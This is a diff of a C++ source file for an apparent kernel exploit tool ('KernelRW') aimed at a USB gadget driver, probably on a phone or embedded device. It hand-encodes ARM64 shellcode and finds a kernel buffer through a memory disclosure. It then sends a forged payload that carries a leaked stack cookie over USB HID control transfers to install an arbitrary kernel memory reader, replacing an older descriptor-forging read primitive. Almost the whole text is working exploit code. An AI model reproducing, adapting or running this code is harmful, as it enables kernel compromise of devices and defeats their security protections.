@@ -15,189 +15,364 @@ static void pack_q(std::vector<uint8_t>& buf, uint64_t val) {
     buf.insert(buf.end(), p, p + 8);
 }
 
+static inline void store_le32(uint8_t* p, uint32_t val) {
+    std::memcpy(p, &val, 4);
+}
+
+static inline void store_le64(uint8_t* p, uint64_t val) {
+    std::memcpy(p, &val, 8);
+}
+
+static inline uint64_t load_le64(const uint8_t* p) {
+    uint64_t val;
+    std::memcpy(&val, p, 8);
+    return val;
+}
+
+static bool arm64_branch(uint64_t from, uint64_t to, bool link, uint32_t* instruction) {
+    if (!instruction || (from & 3U) != 0 || (to & 3U) != 0) return false;
+    int64_t offset = (int64_t)(to - from);
+    if (offset < -((int64_t)0x8000000) || offset > (int64_t)0x7FFFFFC) return false;
+    uint32_t immediate = (uint32_t)(((uint64_t)(offset >> 2)) & 0x03FFFFFF);
+    *instruction = (link ? 0x94000000 : 0x14000000) | immediate;
+    return true;
+}
+
+static bool build_direct_context_helper(uint8_t out[constants::DIRECT_CONTEXT_SC_SIZE]) {
+    std::memset(out, 0, constants::DIRECT_CONTEXT_SC_SIZE);
+    uint32_t branch;
+    store_le32(out + 0, 0xF9400260); // ldr x0, [x19]
+    store_le32(out + 4, 0x91004000); // add x0, x0, #0x10
+    store_le32(out + 8, 0xA9005013); // stp x19, x20, [x0]
+    store_le32(out + 12, 0xA9015815); // stp x21, x22, [x0, #0x10]
+    if (!arm64_branch(constants::DIRECT_CONTEXT_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch))
+        return false;
+    store_le32(out + 16, branch);
+    return true;
+}
+
+static bool build_direct_read_helper(uint8_t out[constants::DIRECT_READ_SC_SIZE]) {
+    std::memset(out, 0, constants::DIRECT_READ_SC_SIZE);
+    uint32_t branch;
+    const uint32_t setup[] = { 0xF9400260, 0x91004000 };
+
+    // Byte entry
+    store_le32(out + 0, setup[0]);
+    store_le32(out + 4, setup[1]);
+    store_le32(out + 8, 0x394003A1);
+    store_le32(out + 12, 0x39000001);
+    if (!arm64_branch(constants::DIRECT_READ_BYTE_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch))
+        return false;
+    store_le32(out + 16, branch);
+
+    // QWord entry
+    store_le32(out + 20, setup[0]);
+    store_le32(out + 24, setup[1]);
+    store_le32(out + 28, 0xF94003A1);
+    store_le32(out + 32, 0xF9000001);
+    if (!arm64_branch(constants::DIRECT_READ_QWORD_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch))
+        return false;
+    store_le32(out + 36, branch);
+
+    // Block entry
+    store_le32(out + 40, setup[0]);
+    store_le32(out + 44, setup[1]);
+    const uint32_t block[] = {
+        0xA9400BA1, 0xA9000801,
+        0xA9410BA1, 0xA9010801,
+        0xA9420BA1, 0xA9020801,
+        0xA9430BA1, 0xA9030801
+    };
+    for (size_t i = 0; i < 8; i++) store_le32(out + 48 + i * 4, block[i]);
+    if (!arm64_branch(constants::DIRECT_READ_BLOCK_SC + 40, constants::MTU3_COMPLETE_RESUME, false, &branch))
+        return false;
+    store_le32(out + 80, branch);
+    return true;
+}
+
+static bool build_cold_cleanup_helper(uint64_t address, uint8_t out[constants::COLD_CLEANUP_SIZE]) {
+    std::memset(out, 0, constants::COLD_CLEANUP_SIZE);
+    uint32_t branch;
+    store_le32(out + 0, 0xF9400E60);
+    store_le32(out + 4, 0xB9402261);
+    if (!arm64_branch(address + 8, constants::PATCH_TEXT, true, &branch)) return false;
+    store_le32(out + 8, branch);
+    store_le32(out + 12, 0xF9403EB4);
+    store_le32(out + 16, 0xAA1503E0);
+    if (!arm64_branch(address + 20, constants::RAW_SPIN_LOCK_ADDR, true, &branch)) return false;
+    store_le32(out + 20, branch);
+    store_le32(out + 24, 0x39033696);
+    if (!arm64_branch(address + 28, constants::MTU3_EP0_ISR_EPILOGUE, false, &branch)) return false;
+    store_le32(out + 28, branch);
+    return true;
+}
+
+static bool append_cold_patch(uint8_t stage[constants::COLD_BOOTSTRAP_STAGE_SIZE], size_t* count, uint64_t target, uint32_t instruction) {
+    constexpr size_t COLD_DESCRIPTOR_OFFSET = 0x180;
+    constexpr size_t COLD_TARGETS_OFFSET = 0x1C0;
+    constexpr size_t COLD_INSTRUCTIONS_OFFSET = 0x300;
+
+    if (!stage || !count || *count >= 40) return false;
+    store_le64(stage + COLD_TARGETS_OFFSET + *count * 8, target);
+    store_le32(stage + COLD_INSTRUCTIONS_OFFSET + *count * 4, instruction);
+    (*count)++;
+    store_le32(stage + COLD_DESCRIPTOR_OFFSET + 0x10, (uint32_t)*count);
+    return true;
+}
+
+static bool build_cold_bootstrap(uint64_t req_buf, uint8_t stage[constants::COLD_BOOTSTRAP_STAGE_SIZE], uint8_t payload[constants::COLD_BOOTSTRAP_PAYLOAD_SIZE]) {
+    uint8_t direct_context[constants::DIRECT_CONTEXT_SC_SIZE];
+    uint8_t direct_read[constants::DIRECT_READ_SC_SIZE];
+    if (!build_direct_context_helper(direct_context) || !build_direct_read_helper(direct_read)) return false;
+
+    uint8_t cleanup[constants::COLD_CLEANUP_SIZE];
+    uint32_t branch;
+    if (!build_cold_cleanup_helper(constants::COLD_CLEANUP_SC, cleanup)) return false;
+
+    std::memset(stage, 0, constants::COLD_BOOTSTRAP_STAGE_SIZE);
+    store_le64(stage + 0x180, req_buf + 0x1C0);
+    store_le64(stage + 0x180 + 8, req_buf + 0x300);
+    store_le64(stage + 0x180 + 0x18, constants::COLD_PATCH_EXIT);
+    store_le32(stage + 0x180 + 0x20, constants::COLD_PATCH_EXIT_ORIGINAL);
+    store_le64(stage + constants::COLD_MARKER_OFFSET, constants::COLD_MARKER_MAGIC0);
+    store_le64(stage + constants::COLD_MARKER_OFFSET + 8, constants::COLD_MARKER_MAGIC1);
+    store_le64(stage + constants::COLD_MARKER_OFFSET + 16, req_buf);
+    store_le64(stage + constants::COLD_MARKER_OFFSET + 24, req_buf ^ constants::COLD_MARKER_XOR);
+
+    size_t count = 0;
+    for (size_t offset = 0; offset < sizeof(cleanup); offset += 4) {
+        uint32_t inst;
+        std::memcpy(&inst, cleanup + offset, 4);
+        if (!append_cold_patch(stage, &count, constants::COLD_CLEANUP_SC + offset, inst)) return false;
+    }
+    for (size_t offset = 0; offset < sizeof(direct_context); offset += 4) {
+        uint32_t inst;
+        std::memcpy(&inst, direct_context + offset, 4);
+        if (!append_cold_patch(stage, &count, constants::DIRECT_CONTEXT_SC + offset, inst)) return false;
+    }
+    for (size_t offset = 0; offset < sizeof(direct_read); offset += 4) {
+        uint32_t inst;
+        std::memcpy(&inst, direct_read + offset, 4);
+        if (!append_cold_patch(stage, &count, constants::DIRECT_READ_SC + offset, inst)) return false;
+    }
+    if (!arm64_branch(constants::COLD_PATCH_EXIT, constants::COLD_CLEANUP_SC, false, &branch) ||
+        !append_cold_patch(stage, &count, constants::COLD_PATCH_EXIT, branch))
+        return false;
+
+    std::memset(payload, 0, constants::COLD_BOOTSTRAP_PAYLOAD_SIZE);
+    payload[0] = 0xF0;
+    payload[1] = 0x02;
+    store_le64(payload + 64, constants::STACK_COOKIE);
+    store_le64(payload + 80, constants::COLD_PATCH_EPILOGUE);
+    store_le64(payload + 96, constants::COLD_PATCH_LOOP);
+    store_le64(payload + 104, req_buf + 0x180);
+    return true;
+}
+
+static bool parse_cold_bootstrap_marker(const std::vector<uint8_t>& stage, uint64_t* request_buffer) {
+    if (request_buffer) *request_buffer = 0;
+    if (stage.size() < constants::COLD_MARKER_OFFSET + 32 || !request_buffer) return false;
+
+    const uint8_t* marker = stage.data() + constants::COLD_MARKER_OFFSET;
+    uint64_t address = load_le64(marker + 16);
+    if (load_le64(marker) != constants::COLD_MARKER_MAGIC0 ||
+        load_le64(marker + 8) != constants::COLD_MARKER_MAGIC1 ||
+        load_le64(marker + 24) != (address ^ constants::COLD_MARKER_XOR) ||
+        address < constants::PAGE_OFFSET_BASE ||
+        (address & (constants::COLD_BOOTSTRAP_STAGE_SIZE - 1U)) != 0)
+        return false;
+    *request_buffer = address;
+    return true;
+}
+
+static bool find_request_buffer(const std::vector<uint8_t>& disclosure, uint64_t* request_buffer, unsigned* votes_out) {
+    if (request_buffer) *request_buffer = 0;
+    if (votes_out) *votes_out = 0;
+    if (disclosure.size() < 8 || !request_buffer) return false;
+
+    const uint8_t* bytes = disclosure.data();
+    uint64_t best_base = 0;
+    unsigned best_votes = 0;
+
+    for (size_t candidate_offset = 0; candidate_offset + 8 <= disclosure.size(); candidate_offset += 8) {
+        uint64_t pointer = load_le64(bytes + candidate_offset);
+        if (pointer < constants::PAGE_OFFSET_BASE || pointer < candidate_offset) continue;
+        uint64_t base = pointer - candidate_offset;
+        if ((base & (constants::COLD_BOOTSTRAP_STAGE_SIZE - 1U)) != 0) continue;
+
+        unsigned votes = 0;
+        for (size_t offset = 0; offset + 8 <= disclosure.size(); offset += 8) {
+            uint64_t value = load_le64(bytes + offset);
+            if (value == base + offset) votes++;
+        }
+        if (votes > best_votes) {
+            best_base = base;
+            best_votes = votes;
+        }
+    }
+
+    if (votes_out) *votes_out = best_votes;
+    LOG_DEBUG << "    [disc] find_request_buffer: best_base=0x" << std::hex << best_base << " best_votes=" << std::dec << best_votes << "\n";
+
+    if (best_votes < 4 || best_base < constants::PAGE_OFFSET_BASE) return false;
+    *request_buffer = best_base;
+    return true;
+}
+
 bool KernelRW::setup_read() {
-    if (_sauth_off) return true;
+    if (request_buffer != 0) return true;
 
-    const std::vector<uint8_t> sauth_marker = {0x1A, 0xCB, 0x0A, 0xFC, 0xBF, 0xFF, 0xFF, 0xFF};
+    static const uint8_t clean_epilogue[] = { 0xfd, 0x7b, 0xc1, 0xa8, 0xc0, 0x03, 0x5f, 0xd6 };
 
-    std::vector<uint8_t> heap = usb->hid_get(0xF2, 0x00, 0x1000);
-
-    if (heap.size() < 0x800) return false;
-
-    auto it = std::search(heap.begin(), heap.end(), sauth_marker.begin(), sauth_marker.end());
-    size_t found_off = -1;
-    
-    if (it != heap.end()) {
-        found_off = std::distance(heap.begin(), it);
-    }
-
-    if (found_off < 0) {
+    std::vector<uint8_t> disclosure = usb->hid_get(0xF2, 0x00, 0x1000);
+    if (disclosure.size() != 0x1000) {
+        LOG_ERROR << "    [-] EP0 disclosure was short (" << disclosure.size() << "/0x1000 bytes).\n";
         return false;
     }
 
-    forge_desc_off = found_off + constants::DESC_PTR_OFFSET;
-    
-    uint64_t current_descriptor = *reinterpret_cast<uint64_t*>(heap.data() + forge_desc_off);
-    
-    if (current_descriptor != constants::DESC_EXPECTED_VALUE) {
-        LOG_ERROR << "Real descriptor was not set! Expected: " << constants::DESC_EXPECTED_VALUE << " Got: " << current_descriptor << std::endl;
+    uint64_t req_buf = 0;
+    unsigned votes = 0;
+
+    if (parse_cold_bootstrap_marker(disclosure, &req_buf)) {
+        request_buffer = req_buf;
+        
+        uint8_t test_buf[8] = {0};
+        uint8_t context_buf[32] = {0};
+        uint64_t live[4] = {0};
+        bool text_ok = direct_read_raw(constants::CLEAN_RETURN, test_buf, 8) && std::memcmp(test_buf, clean_epilogue, 8) == 0;
+        bool context_ok = false;
+
+        if (text_ok && direct_exchange(1, constants::DIRECT_CONTEXT_SC, context_buf, 32)) {
+            live[0] = load_le64(context_buf + 0);
+            live[1] = load_le64(context_buf + 8);
+            live[2] = load_le64(context_buf + 16);
+            live[3] = load_le64(context_buf + 24);
+
+            uint64_t verify_buf = 0;
+            uint64_t verify_mep = 0;
+            context_ok = (live[0] >= constants::PAGE_OFFSET_BASE &&
+                          live[1] >= constants::PAGE_OFFSET_BASE &&
+                          live[2] >= constants::PAGE_OFFSET_BASE &&
+                          live[3] <= 255 &&
+                          direct_read_raw(live[0], (uint8_t*)&verify_buf, 8) &&
+                          verify_buf == req_buf &&
+                          direct_read_raw(live[0] + 0x68, (uint8_t*)&verify_mep, 8) &&
+                          verify_mep == live[1]);
+        }
+
+        if (text_ok && context_ok) {
+            LOG_DEBUG << "    [+] Reusing installed reader (EP0 buffer: 0x" << std::hex << req_buf << std::dec << ")\n";
+            return true;
+        }
+
+        request_buffer = 0;
+        LOG_WARN << "    [-] Installed direct-reader self-test failed (text=" 
+                 << (text_ok ? "ok" : "mismatch") << ", context=" << (context_ok ? "ok" : "mismatch") 
+                 << "). Re-bootstrapping reader...\n";
+    }
+
+    if (!find_request_buffer(disclosure, &req_buf, &votes)) {
+        LOG_ERROR << "    [-] Exact EP0 self-map and installed-state marker were not found.\n";
         return false;
     }
 
-    _sauth_off = found_off;
-    cached_heap = heap;
+    std::vector<uint8_t> stage(constants::COLD_BOOTSTRAP_STAGE_SIZE, 0);
+    std::vector<uint8_t> payload(constants::COLD_BOOTSTRAP_PAYLOAD_SIZE, 0);
+    if (!build_cold_bootstrap(req_buf, stage.data(), payload.data())) {
+        LOG_ERROR << "    [-] Exact cold-bootstrap encoding failed.\n";
+        return false;
+    }
 
-    forge_desc_val = constants::u64(heap.data() + forge_desc_off);
-    
+    LOG_DEBUG << "    [+] EP0 buffer: 0x" << std::hex << req_buf << std::dec << " (" << votes << " exact self-references)\n";
+
+    if (usb->hid_set(0xFF, 0xFF, stage) != (int)stage.size()) {
+        LOG_ERROR << "    [-] EP0 patch-table staging failed.\n";
+        return false;
+    }
+
+    if (usb->hid_set(0xF0, 0x01, payload) != (int)payload.size()) {
+        LOG_ERROR << "    [-] Exact cold-bootstrap transfer failed.\n";
+        return false;
+    }
+
+    request_buffer = req_buf;
+
+    uint8_t test_buf[8] = {0};
+    if (!direct_read_raw(constants::CLEAN_RETURN, test_buf, 8) || std::memcmp(test_buf, clean_epilogue, 8) != 0) {
+        request_buffer = 0;
+        LOG_ERROR << "    [-] Direct read self-test failed.\n";
+        return false;
+    }
+
     return true;
 }
 
 uint64_t KernelRW::retrieve_get_alt() {
-    int HEAP_SEND_SIZE = 0x1000;
-    std::vector<uint8_t> heap = usb->hid_get(0xF2, 0, HEAP_SEND_SIZE);
-    return constants::u64(heap.data() + _sauth_off + constants::GET_ALT_OFFSET);
+    return 0;
 }
 
-std::vector<uint8_t> KernelRW::_read_raw(uint64_t addr, size_t length) {
-    if (cached_heap.empty()) return {};
+bool KernelRW::direct_exchange(uint64_t target, uint64_t helper, uint8_t* out, size_t length) {
+    if (!out || !length || length > 64) return false;
 
-    std::vector<uint8_t> buf = cached_heap;
-    
-    uint64_t base_forge = constants::REPORT_0xFF;
-    std::memcpy(buf.data() + forge_desc_off, &base_forge, 8);
-    
-    const std::vector<uint8_t> null_sig = {0x09, 0x04, 0x01, 0x00, 0x00, 0x01, 0x01};
-    std::vector<uint8_t> result;
-    size_t offset = 0;
+    std::vector<uint8_t> payload(88, 0);
+    payload[0] = 0xF0;
+    payload[1] = 0x02;
 
-    size_t HEAP_SEND_SIZE = forge_desc_off + 8;
-    std::vector<uint8_t> payload(buf.begin(), buf.begin() + std::min(HEAP_SEND_SIZE, buf.size()));
-    if (usb->hid_set(0xF2, 0x00, payload) == 0) {
-        LOG_ERROR << "Failed to set forged descriptor address!" << std::endl;
-        return {};
+    uint64_t cookie = constants::STACK_COOKIE;
+    store_le64(payload.data() + 64, cookie);
+    store_le64(payload.data() + 72, target);
+    store_le64(payload.data() + 80, helper);
+
+    int sent = usb->hid_set(0xF0, 0x01, payload);
+    if (sent != (int)payload.size()) return false;
+
+    uint16_t response_length = static_cast<uint16_t>(16 + length);
+    std::vector<uint8_t> response;
+    for (int retry = 0; retry < 3; ++retry) {
+        response = usb->hid_get(0xF2, 0, response_length);
+        if (response.size() >= response_length && response[0] == 0xF2) break;
+        std::this_thread::sleep_for(std::chrono::milliseconds(5));
     }
+    if (response.size() < response_length || response[0] != 0xF2) return false;
 
-    std::vector<uint8_t> heap = usb->hid_get(0xF2, 0x00, payload.size());
-    if (heap.size() == 0) {
-        LOG_ERROR << "Failed to get heap!" << std::endl;
-        return {};
-    }
-
-    uint64_t current_descriptor = *reinterpret_cast<uint64_t*>(heap.data() + forge_desc_off);
-
-    if (current_descriptor != base_forge) {
-        LOG_ERROR << "Forge descriptor was not set! Expected: " << base_forge << " Got: " << current_descriptor << std::endl;
-        return {};
-    }
-
-    while (offset < length) {
-        uint64_t target_addr = addr + offset;
-        
-        // Pointer to target address (8 bytes) + NULL (8 bytes)
-        std::vector<uint8_t> addrVal(16, 0);
-        std::memcpy(addrVal.data(), &target_addr, 8);
-
-        usb->vendor_set(0xFF, 0xFF, addrVal);
-
-        std::vector<uint8_t> desc = usb->get_config_desc(266);
-        if (desc.empty()) return {};
-
-        if (desc.size() > 16 && std::equal(null_sig.begin(), null_sig.end(), desc.begin() + 9)) {
-            result.push_back(0);
-            offset++;
-        } else if (desc.size() > 9) {
-            uint8_t b = desc[9];
-            result.push_back(b);
-            offset++;
-            if (b > 0 && b < 200) {
-                int extra = std::min({(int)b - 1, (int)desc.size() - 10, (int)length - (int)offset});
-                if (extra > 0) {
-                    result.insert(result.end(), desc.begin() + 10, desc.begin() + 10 + extra);
-                    offset += extra;
-                }
-            }
-        } else {
-            return {};
-        }
-    }
-    return result;
+    std::memcpy(out, response.data() + 16, length);
+    return true;
 }
 
-std::vector<uint8_t> KernelRW::_read_raw_rop(uint64_t addr, size_t length) {
-    uint64_t base_desc_forge = sauth + constants::DESC_PTR_OFFSET;
-    uint64_t base_forge = sauth + constants::AUTH1_DATA_OFFSET;
-
-    write_u64_slow(base_desc_forge, base_forge);
-    
-    const std::vector<uint8_t> null_sig = {0x09, 0x04, 0x01, 0x00, 0x00, 0x01, 0x01};
-    std::vector<uint8_t> result;
-    size_t offset = 0;
-
-    uint64_t last_target_addr = -1;
-
-    while (offset < length) {
-        uint64_t target_addr = addr + offset;
-        
-        for (int i = 0; i < 8; i++) {
-            uint8_t new_byte = (target_addr >> (i * 8)) & 0xFF;
-            uint8_t old_byte = (last_target_addr >> (i * 8)) & 0xFF;
-            if (new_byte != old_byte || last_target_addr == (uint64_t)-1) {
-                write_byte(base_forge + i, new_byte);
-            }
-        }
-        last_target_addr = target_addr;
-
-        std::vector<uint8_t> desc = usb->get_config_desc(266);
-        if (desc.empty()) return {};
-
-        if (desc.size() > 16 && std::equal(null_sig.begin(), null_sig.end(), desc.begin() + 9)) {
-            result.push_back(0);
-            offset++;
-        } else if (desc.size() > 9) {
-            uint8_t b = desc[9];
-            result.push_back(b);
-            offset++;
-            if (b > 0 && b < 200) {
-                int extra = std::min({(int)b - 1, (int)desc.size() - 10, (int)length - (int)offset});
-                if (extra > 0) {
-                    result.insert(result.end(), desc.begin() + 10, desc.begin() + 10 + extra);
-                    offset += extra;
-                }
-            }
-        } else {
-            return {};
-        }
+static size_t direct_read_transfer_size(uint64_t address, size_t remaining, uint64_t* helper) {
+    size_t page_remaining = 0x1000 - (size_t)(address & (0x1000 - 1));
+    if (remaining >= 64 && page_remaining >= 64) {
+        *helper = constants::DIRECT_READ_BLOCK_SC;
+        return 64;
     }
-    return result;
+    if (remaining >= 8 && page_remaining >= 8) {
+        *helper = constants::DIRECT_READ_QWORD_SC;
+        return 8;
+    }
+    *helper = constants::DIRECT_READ_BYTE_SC;
+    return 1;
+}
+
+bool KernelRW::direct_read_raw(uint64_t address, uint8_t* out, size_t length) {
+    if (!out || !length || address > UINT64_MAX - static_cast<uint64_t>(length - 1)) return false;
+
+    for (size_t offset = 0; offset < length; ) {
+        uint64_t helper = 0;
+        size_t count = direct_read_transfer_size(address + offset, length - offset, &helper);
+        if (!direct_exchange(address + offset, helper, out + offset, count)) {
+            return false;
+        }
+        offset += count;
+    }
+    return true;
 }
 
 std::vector<uint8_t> KernelRW::read(uint64_t addr, size_t length) {
-    std::vector<uint8_t> data;
-    size_t chunk_size = 0x1000;
-
-    for (size_t i = 0; i < length; i += chunk_size) {
-        size_t clen = std::min(chunk_size, length - i);
-        
-        bool success = false;
-        for (int attempt = 0; attempt < 10; attempt++) {
-            std::vector<uint8_t> chunk;
-            if (sauth)
-                chunk = _read_raw_rop(addr + i, clen);
-            else
-                chunk = _read_raw(addr + i, clen);
-            
-            if (!chunk.empty()) {
-                data.insert(data.end(), chunk.begin(), chunk.end());
-                success = true;
-                break;
-            }
-        }
-        if (!success) {
-            repair_descriptor();
-            return {};
-        }
+    if (length == 0) return {};
+    std::vector<uint8_t> data(length);
+    if (!direct_read_raw(addr, data.data(), length)) {
+        return {};
     }
-    repair_descriptor();
     return data;
 }
 
@@ -207,17 +382,6 @@ uint64_t KernelRW::read_ptr(uint64_t addr) {
 }
 
 void KernelRW::repair_descriptor() {
-    if (sauth) {
-        uint64_t base_desc_forge = sauth + constants::DESC_PTR_OFFSET;
-        write_u64_slow(base_desc_forge, forge_desc_val);
-    }
-    else {
-        if (!cached_heap.empty()) {
-            size_t HEAP_SEND_SIZE = forge_desc_off + 8;
-            std::vector<uint8_t> payload(cached_heap.begin(), cached_heap.begin() + std::min(HEAP_SEND_SIZE, cached_heap.size()));
-            usb->hid_set(0xFF, 0xFF, payload);
-        }
-    }
 }
 
 Registers KernelRW::discover_registers() {
@@ -225,30 +389,15 @@ Registers KernelRW::discover_registers() {
         return cached_registers;
     }
 
-    if (cached_heap.empty()) {
+    uint8_t data[32] = {0};
+    if (!direct_exchange(1, constants::DIRECT_CONTEXT_SC, data, 32)) {
+        LOG_ERROR << "[-] direct_exchange for DIRECT_CONTEXT_SC failed.\n";
         return cached_registers;
     }
 
-    uint64_t config_ptr_off = _sauth_off + constants::CONFIG_PTR_OFFSET;
-    if (config_ptr_off + 8 > cached_heap.size()) return cached_registers;
-
-    uint64_t config = constants::u64(cached_heap.data() + config_ptr_off);
-    auto cd = read(config, 0x40);
-    if (cd.empty()) return cached_registers;
-
-    uint64_t cdev = constants::u64(cd.data() + 0x30);
-    auto cdev_d = read(cdev, 0x20);
-    if (cdev_d.empty()) return cached_registers;
-
-    cached_registers.req = constants::u64(cdev_d.data() + 0x08);
-    auto req_d = read(cached_registers.req, 0x80);
-    if (!req_d.empty()) cached_registers.x21 = constants::u64(req_d.data() + 0x70);
-
-    uint64_t gadget = constants::u64(cdev_d.data() + 0x00);
-    auto gd = read(gadget, 0x10);
-    if (gd.empty()) return cached_registers;
-
-    cached_registers.mep = constants::u64(gd.data() + 0x08);
+    cached_registers.req = load_le64(data + 0);
+    cached_registers.mep = load_le64(data + 8);
+    cached_registers.x21 = load_le64(data + 16);
 
     sauth = read_ptr(constants::SAUTH_SIEUSB);
 
@@ -257,7 +406,6 @@ Registers KernelRW::discover_registers() {
               << "    - mep: 0x" << std::hex << cached_registers.mep << "\n"
               << "    - x21: 0x" << std::hex << cached_registers.x21 << " (spinlock)\n"
               << "    - sauth: 0x" << std::hex << sauth << "\n";
-              
 
     return cached_registers;
 }
